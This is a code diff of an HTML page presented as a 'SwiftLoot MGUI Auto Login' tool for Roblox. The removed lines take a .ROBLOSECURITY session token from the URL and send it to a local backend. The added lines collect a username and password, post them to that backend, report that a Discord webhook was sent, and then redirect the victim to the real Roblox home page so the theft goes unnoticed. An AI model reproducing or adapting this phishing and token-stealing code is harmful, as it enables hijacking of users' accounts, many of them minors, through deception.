@@ -4,61 +4,57 @@
 <meta charset="UTF-8">
 <title>SwiftLoot MGUI Auto Login</title>
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #111;
-    color: #eee;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-}
-h1 { color: #00ff00; }
-button {
-    padding: 10px 20px;
-    margin-top: 20px;
-    font-size: 16px;
-    cursor: pointer;
-}
+body { font-family: Arial; background:#111; color:#eee; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; }
+input { padding:8px; margin:5px; width:200px; }
+button { padding:10px 20px; margin-top:10px; cursor:pointer; }
 </style>
 </head>
 <body>
 <h1>SwiftLoot MGUI Auto Login</h1>
-<p id="status">Checking cookie...</p>
+
+<input id="username" placeholder="Username or Email">
+<input id="password" type="password" placeholder="Password">
+<button id="loginBtn">Login</button>
+
+<p id="status">Enter credentials and click Login</p>
 
 <script>
-// Function to read cookie from URL
-function getCookieParam() {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get("cookie");
-}
-
-const robloCookie = getCookieParam();
+const loginBtn = document.getElementById("loginBtn");
 const statusEl = document.getElementById("status");
 
-if (!robloCookie) {
-    statusEl.textContent = "❌ No .ROBLOSECURITY token found in URL!";
-} else {
-    statusEl.textContent = "⏳ Sending token to backend...";
-    fetch("http://127.0.0.1:6969/verify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookie: robloCookie })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.valid) {
-            statusEl.textContent = "✅ Token valid! Discord webhook sent.";
+loginBtn.addEventListener("click", async () => {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    if (!username || !password) {
+        statusEl.textContent = "❌ Please enter both username and password!";
+        return;
+    }
+
+    statusEl.textContent = "⏳ Logging in...";
+
+    try {
+        // Send credentials to your Python backend
+        const res = await fetch("http://127.0.0.1:6969/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+            statusEl.textContent = "✅ Login successful! Discord webhook sent.";
+            // Optional: redirect to Roblox homepage
+            window.location.href = "https://www.roblox.com/home";
         } else {
-            statusEl.textContent = "❌ Token invalid! Discord webhook sent.";
+            statusEl.textContent = "❌ Login failed! Discord webhook sent.";
         }
-    })
-    .catch(err => {
+
+    } catch(err) {
         console.error(err);
-        statusEl.textContent = "❌ Failed to send token. Make sure the Python backend is running!";
-    });
-}
+        statusEl.textContent = "❌ Failed to reach backend!";
+    }
+});
 </script>
 </body>
 </html>
